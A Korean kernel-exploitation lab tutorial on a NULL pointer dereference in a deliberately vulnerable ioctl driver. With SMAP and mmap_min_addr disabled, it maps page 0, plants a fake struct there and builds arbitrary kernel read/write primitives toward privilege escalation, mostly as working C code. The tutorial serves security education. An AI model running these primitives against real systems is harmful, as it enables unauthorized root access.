---
title: NULL Pointer Dereference
tags:
    - [Linux]
    - [Kernel]
    - [NULL Pointer Dereference]
lang: kr
permalink: /kr/linux-kernel/LK02/null_ptr_deref.html
pagination: true
bk: ../LK01/race_condition.html
fd: ../LK03/double_fetch.html
---
Kernel Exploit에 필요한 핵심 지식은 대부분 LK01에서 이미 설명했으므로, 이제부터는 커널 공간 특유의 공격 기법이나 Linux 커널 기능을 노린 공격처럼 좀 더 세부적인 내용을 다룹니다.
LK02(Angus)에서는 커널 공간의 NULL Pointer Dereference를 악용하는 방법을 배웁니다. 먼저 [연습 문제 LK02](distfiles/LK02.tar.gz)를 다운로드하세요.

## 이번 장에서 다루는 취약점
LK02의 QEMU 시작 옵션을 보면 알 수 있듯, 이번 공격 대상 머신에서는 SMAP가 비활성화되어 있습니다. 이번 장의 NULL Pointer Dereference는 SMAP가 꺼져 있지 않으면 exploit할 수 없습니다.

또한 커널을 부팅한 뒤 다음 명령을 실행해 보세요.
```
$ cat /proc/sys/vm/mmap_min_addr
0
```
[`mmap_min_addr`](https://elixir.bootlin.com/linux/v5.17.1/source/security/min_addr.c#L8)는 사용자 공간이 `mmap`으로 매핑할 수 있는 최저 주소를 제한하는 Linux 커널 변수입니다. 기본값은 보통 0이 아니지만, 이번 타깃에서는 `0`입니다. 이 변수는 바로 이번 장에서 다루는 NULL pointer dereference를 막기 위한 mitigation으로 Linux 2.6.23부터 도입되었습니다.

즉 이번 장의 공격은 SMAP와 저주소 매핑 제한이 우회되거나 비활성화된 상황을 전제로 합니다. 최신 Linux 기본 설정에서 바로 쓸 수 있는 기법만 관심 있다면 건너뛰어도 됩니다.

## 취약점 확인
먼저 `src/angus.c`에 있는 LK02 소스를 읽어 봅시다.

### `ioctl`
LK01과 크게 다른 점은 `read`, `write` 대신 `ioctl` 핸들러가 구현돼 있다는 것입니다.
파일 디스크립터에 `ioctl`을 호출하면 대응하는 커널/드라이버 쪽 `ioctl` 핸들러가 실행됩니다.
`ioctl`은 파일 디스크립터 외에 `request`, `argp` 두 개의 인자를 받습니다.
```
ioctl(fd, request, argp);
```
`request`는 장치 드라이버가 정의한 요청 코드입니다. 따라서 어떤 요청이 가능한지는 소스를 읽어야 알 수 있습니다.
`argp`에는 일반적으로 사용자 공간 데이터 포인터가 들어가며, 커널 모듈은 `copy_from_user`로 그 내용을 읽어 옵니다.

이번 모듈은 사용자 공간에서 `request_t` 구조체를 넘기도록 설계되어 있습니다.
```c
typedef struct {
  char *ptr;
  size_t len;
} request_t;

...

static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  request_t req;
  XorCipher *ctx;

  if (copy_from_user(&req, (void*)arg, sizeof(request_t)))
    return -EINVAL;
```
또한 요청 코드에 따라 처리 분기가 달라지는 것도 확인할 수 있습니다.
```c
  switch (cmd) {
    case CMD_INIT:
      if (!ctx)
        filp->private_data = (void*)kzalloc(sizeof(XorCipher), GFP_KERNEL);
      if (!filp->private_data) return -ENOMEM;
      break;

    case CMD_SETKEY:
      ...
      break;

    case CMD_SETDATA:
      ...
```
이 `ioctl` 구현을 자세히 보기 전에 `private_data`부터 이해해야 합니다.

### `file` 구조체
사용자 공간에서는 파일 디스크립터로 드라이버를 조작하지만, 커널 쪽에서는 그것이 [`struct file`](https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/fs.h#L956)로 전달됩니다.
이 구조체에는 파일 오프셋 같은 파일별 상태도 들어 있지만, 드라이버가 자유롭게 써도 되는 필드로 `private_data`가 있습니다.
```c
struct file {
    ...
	/* needed for tty driver, and maybe others */
	void			*private_data;
```
드라이버는 여기에 원하는 데이터를 넣을 수 있지만, 당연히 할당과 해제는 스스로 올바르게 처리해야 합니다.
이번 드라이버는 `XorCipher`라는 구조체를 여기에 저장합니다.
```c
static int module_open(struct inode *inode, struct file *filp) {
  filp->private_data = NULL;
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  if (filp->private_data)
    kfree(filp->private_data);
  return 0;
}
...
  switch (cmd) {
    case CMD_INIT:
      if (!ctx)
        filp->private_data = (void*)kzalloc(sizeof(XorCipher), GFP_KERNEL);
      if (!filp->private_data) return -ENOMEM;
      break;
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="늑대" ></div>
  <p class="says">
    Holstein v4도 데이터를 `private_data`에 넣었다면 그 race는 훨씬 덜 단순했겠지.
  </p>
</div>

### 프로그램 개요
이 드라이버는 XOR 암호로 데이터를 암호화/복호화하는 커널 모듈입니다.
`ioctl`로 조작하며, 다음 6개의 요청 코드를 가집니다.
```c
#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006
```

`CMD_INIT`를 호출하면 `private_data`에 `XorCipher`가 할당됩니다.
```c
typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;
...
    case CMD_INIT:
      if (!ctx)
        filp->private_data = (void*)kzalloc(sizeof(XorCipher), GFP_KERNEL);
      if (!filp->private_data) return -ENOMEM;
      break;
```
이 구조체는 키 `key`와 그 길이 `keylen`, 데이터 `data`와 그 길이 `datalen`을 가집니다.

`CMD_SETKEY`는 사용자 공간에서 키를 복사합니다. 이미 키가 있으면 먼저 해제합니다.
```c
    case CMD_SETKEY:
      if (!ctx) return -EINVAL;
      if (!req.ptr || req.len > 0x1000) return -EINVAL;
      if (ctx->key) kfree(ctx->key);
      if (!(ctx->key = (char*)kmalloc(req.len, GFP_KERNEL))) return -ENOMEM;

      if (copy_from_user(ctx->key, req.ptr, req.len)) {
        kfree(ctx->key);
        ctx->key = NULL;
        return -EINVAL;
      }

      ctx->keylen = req.len;
      break;
```
마찬가지로 `CMD_SETDATA`는 암호화/복호화할 데이터를 사용자 공간에서 가져옵니다.
```c
    case CMD_SETDATA:
      if (!ctx) return -EINVAL;
      if (!req.ptr || req.len > 0x1000) return -EINVAL;
      if (ctx->data) kfree(ctx->data);
      if (!(ctx->data = (char*)kmalloc(req.len, GFP_KERNEL))) return -ENOMEM;

      if (copy_from_user(ctx->data, req.ptr, req.len)) {
        kfree(ctx->key);
        ctx->key = NULL;
        return -EINVAL;
      }

      ctx->datalen = req.len;
      break;
```
처리된 데이터는 `CMD_GETDATA`로 사용자 공간에 다시 가져올 수 있습니다.
```c
    case CMD_GETDATA:
      if (!ctx->data) return -EINVAL;
      if (!req.ptr || req.len > ctx->datalen) return -EINVAL;
      if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
      break;
```
마지막으로 `CMD_ENCRYPT`와 `CMD_DECRYPT`는 같은 XOR 함수를 호출합니다.
```c
long xor(XorCipher *ctx) {
  size_t i;

  if (!ctx->data || !ctx->key) return -EINVAL;
  for (i = 0; i < ctx->datalen; i++)
    ctx->data[i] ^= ctx->key[i % ctx->keylen];
  return 0;
}

...

    case CMD_ENCRYPT:
    case CMD_DECRYPT:
      return xor(ctx);
```

### 취약점 조사
이 드라이버에는 눈에 띄는 버퍼 오버플로나 Use-after-Free는 없습니다.
하지만 암호화/복호화 경로를 자세히 읽어 보면 NULL pointer dereference가 있습니다.

`ioctl` 시작 부분에서 `private_data` 포인터를 `XorCipher *`로 가져옵니다.
```c
  ctx = (XorCipher*)filp->private_data;
```
그리고 `CMD_SETKEY` 같은 요청에서는 `private_data`가 초기화됐는지 검사합니다.
```c
if (!ctx) return -EINVAL;
```
하지만 `CMD_GETDATA`, `CMD_ENCRYPT`, `CMD_DECRYPT`에는 이 검사가 없습니다.
```c
long xor(XorCipher *ctx) {
  size_t i;

  if (!ctx->data || !ctx->key) return -EINVAL; // ctx NULL 체크 없음
  for (i = 0; i < ctx->datalen; i++)
    ctx->data[i] ^= ctx->key[i % ctx->keylen];
  return 0;
}
...
    case CMD_GETDATA:
      if (!ctx->data) return -EINVAL; // ctx NULL 체크 없음
      if (!req.ptr || req.len > ctx->datalen) return -EINVAL;
      if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
      break;

    case CMD_ENCRYPT:
    case CMD_DECRYPT:
      return xor(ctx);
```
즉 `private_data`를 초기화하지 않은 채 이 경로들에 들어오면, 결국 초기화되지 않은 `XorCipher`, 실질적으로는 `NULL` 포인터를 역참조하게 됩니다.

### 취약점 확인
먼저 드라이버를 정상적인 방식으로 호출해 봅시다. 각 요청 코드에 대응하는 helper를 만들어 두면 편합니다.
```c
int angus_init(void) {
  request_t req = { NULL };
  return ioctl(fd, CMD_INIT, &req);
}
int angus_setkey(char *key, size_t keylen) {
  request_t req = { .ptr = key, .len = keylen };
  return ioctl(fd, CMD_SETKEY, &req);
}
int angus_setdata(char *data, size_t datalen) {
  request_t req = { .ptr = data, .len = datalen };
  return ioctl(fd, CMD_SETDATA, &req);
}
int angus_getdata(char *data, size_t datalen) {
  request_t req = { .ptr = data, .len = datalen };
  return ioctl(fd, CMD_GETDATA, &req);
}
int angus_encrypt() {
  request_t req = { NULL };
  return ioctl(fd, CMD_ENCRYPT, &req);
}
int angus_decrypt() {
  request_t req = { NULL };
  return ioctl(fd, CMD_ENCRYPT, &req);
}
```
예를 들어 `"ABC123"` 키로 `"Hello, World!"`를 암호화/복호화해 봅시다.
```c
int main() {
  unsigned char buf[0x10];
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  angus_init();
  angus_setkey("ABC123", 6);
  angus_setdata("Hello, World!", 13);

  angus_encrypt();
  angus_getdata(buf, 13);
  for (int i = 0; i < 13; i++) {
    printf("%02x ", buf[i]);
  }
  putchar('\n');

  angus_decrypt();
  angus_getdata(buf, 13);
  for (int i = 0; i < 13; i++) {
    printf("%02x ", buf[i]);
  }
  putchar('\n');

  close(fd);
  return 0;
}
```
암호화/복호화가 잘 되면 정상 사용은 성공입니다.

<center>
  <img src="img/angus_usage.png" alt="Angus 모듈의 정상 사용" style="width:320px;">
</center>

이제 `XorCipher`를 초기화하지 않은 상태에서 암호화를 호출해 봅시다.
```c
int main() {
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  //angus_init();
  angus_encrypt();

  close(fd);
  return 0;
}
```
실행하면 다음과 같이 커널 패닉이 날 것입니다.

<center>
  <img src="img/angus_crash.png" alt="크래시 모습" style="width:640px;">
</center>

BUG 메시지를 보면 `kernel NULL pointer dereference, address: 0000000000000008`라고 나옵니다. 분석한 대로 `NULL` 포인터 역참조로 크래시한 것입니다. 사용자 공간에서도 NULL pointer dereference는 자주 발생하지만, 보통 exploitable하지 않습니다. 그럼 이번에는 왜 권한 상승으로 이어질까요?

## 가상 메모리와 `mmap_min_addr`
[Linux 메모리 레이아웃 문서](https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt)에 따르면 가상 메모리는 주소 구간마다 용도가 다릅니다. 예를 들어 `0000000000000000`부터 `00007fffffffffff`까지는 사용자 공간입니다. 한편 `ffffffff80000000`부터 `ffffffff9fffffff`까지는 커널 데이터 영역입니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
  <p class="says">
    Linux는 48비트 가상 주소를 64비트로 sign-extension해서 사용해. 그래서 `0x800000000000`부터 `0xffff7fffffffffff`까지는 non-canonical이라 유효한 주소가 아니야.
  </p>
</div>

핵심은 `0000000000000000`부터 `00007fffffffffff`가 사용자 공간이라는 점입니다.
즉 주소 `0`이 실제로 매핑돼 있다면, NULL pointer dereference가 곧바로 세그폴트를 일으키지 않고 공격자 제어 데이터를 읽거나 쓸 수도 있습니다.

커널 공간에서 SMAP가 꺼져 있으면 커널은 NULL pointer dereference 과정에서 사용자 공간 메모리를 읽을 수 있습니다. 그러면 공격자는 주소 `0`에 가짜 데이터를 깔아 두고 커널이 그것을 신뢰하게 만들 수 있습니다.

보통 `mmap`의 첫 번째 인자를 `0`으로 주면 커널이 알아서 주소를 고릅니다. 하지만 `MAP_FIXED`를 사용하면 요청한 주소에 정확히 매핑하거나 실패합니다. 따라서 페이지 0을 직접 매핑할 수 있습니다. KPTI가 켜져 있으므로 `MAP_POPULATE`도 잊지 마세요.
```c
mmap(0, 0x1000, PROT_READ|PROT_WRITE,
     MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,
     -1, 0);
```

이 방법은 챌린지 머신에서는 동작하지만 일반 Linux에서는 대개 실패합니다. 바로 `mmap_min_addr` mitigation 때문입니다.
```
$ cat /proc/sys/vm/mmap_min_addr
65536
```
사용자 공간은 이 값보다 작은 주소에 메모리를 매핑할 수 없습니다. 그래서 보통은 NULL pointer dereference가 exploit 불가능합니다. 하지만 이번 챌린지에서는 `mmap_min_addr`가 `0`이므로 공격이 가능합니다.

## 권한 상승
드라이버는 `XorCipher`를 NULL 포인터를 통해 역참조하므로, 공격자는 주소 `0`에 가짜 `XorCipher` 객체를 준비할 수 있습니다.
```c
typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;
```

`data` 포인터와 `datalen`을 제어하면 `CMD_GETDATA`로 임의 주소 읽기가 가능합니다. 여기에 `key`와 `keylen`까지 적절히 맞추면 임의 주소 쓰기도 가능합니다.

즉 이번 취약점은 매우 강력한 AAR/AAW primitive를 줍니다. `CMD_GETDATA`는 `copy_to_user`를 사용해 커널 메모리를 사용자 공간으로 복사합니다.
```c
if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
```
`copy_to_user`, `copy_from_user` 같은 함수는 잘못된 주소가 들어와도 커널이 바로 크래시하지 않고 실패하도록 설계되어 있습니다. 따라서 KASLR이 켜져 있어도 주소를 추측하며 시도하다 보면 언젠가 `copy_to_user`가 성공하는 지점을 찾을 수 있습니다.

어쨌든 먼저 AAR/AAW를 만들어 보고, 사용자 공간 데이터를 읽고 쓰면서 구현이 맞는지 확인합시다.
```c
XorCipher *nullptr = NULL;

void AAR(char *dst, char *src, size_t len) {
  nullptr->data = src;
  nullptr->datalen = len;
  angus_getdata(dst, len);
}

void AAW(char *dst, char *src, size_t len) {
  // xor를 이용해 AAW를 만들므로, 먼저 원래 데이터를 읽어 온다
  char *tmp = (char*)malloc(len);
  if (tmp == NULL) fatal("malloc");
  AAR(tmp, dst, len);

  // xor 결과가 원하는 값이 되도록 조정
  for (size_t i = 0; i < len; i++)
    tmp[i] ^= src[i];

  // 쓰기
  nullptr->data = dst;
  nullptr->datalen = len;
  nullptr->key = tmp;
  nullptr->keylen = len;
  angus_encrypt();

  free(tmp);
}

int main() {
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  // NULL 페이지에 가짜 XorCipher 준비
  if (mmap(0, 0x1000, PROT_READ|PROT_WRITE,
           MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE,
           -1, 0) != NULL)
    fatal("mmap");

  // AAR/AAW 테스트
  char buf[0x10];
  AAR(buf, "Hello, World!", 13);
  printf("AAR: %s\n", buf);
  AAW(buf, "This is a test", 14);
  printf("AAW: %s\n", buf);

  close(fd);
  return 0;
}
```
이제 AAR/AAW primitive를 얻었습니다.

<center>
  <img src="img/angus_aaraaw.png" alt="AAR/AAW primitive 생성" style="width:280px;">
</center>

이후에는 커널 베이스 주소를 누출하거나, `cred` 구조체를 찾거나, 원하는 방식으로 권한 상승을 진행하면 됩니다. 샘플 exploit는 [여기](exploit/angus_exploit.c)에서 받을 수 있습니다.

<center>
  <img src="img/angus_privesc.png" alt="권한 상승" style="width:320px;">
</center>

[^1]: 물론 `lseek`를 지원하려면 그 핸들러도 커널 모듈 쪽에서 올바르게 구현해야 합니다.

----

<div class="column" title="예제">
  <code>cred</code> 구조체를 찾는 방법, 커널 베이스 주소를 찾는 방법 등을 여러 가지 시도해 보세요. 평균적으로 어떤 방법이 가장 빠른지, 그리고 각 방법의 장단점이 무엇인지 비교해 보세요.
</div>
